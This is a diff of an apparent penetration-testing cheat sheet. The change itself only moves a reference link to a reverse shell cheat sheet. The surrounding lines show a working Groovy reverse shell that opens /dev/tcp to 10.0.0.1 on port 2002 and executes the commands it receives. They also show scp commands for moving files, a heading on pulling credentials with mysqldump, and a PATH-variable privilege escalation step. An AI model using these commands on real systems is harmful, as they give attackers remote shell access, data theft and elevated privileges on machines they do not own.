@@ -119,6 +119,8 @@ r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
+More information regarding reverse TCP:
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 ### [SCP Transfer]
 ```
@@ -137,6 +139,7 @@ scp -r foldername username@IP:/local/directory
 (Specify Port)
 scp -P 2222 file username@IP:/local/directory
 ```
+
 ### [Extracting Creds from mysql using mysqldump util]
 ```
 Local
@@ -154,6 +157,3 @@ export PATH=/location/to/redirection/execution:$PATH
 ```
 More information regarding abusing PATH
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
-
-Source:
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
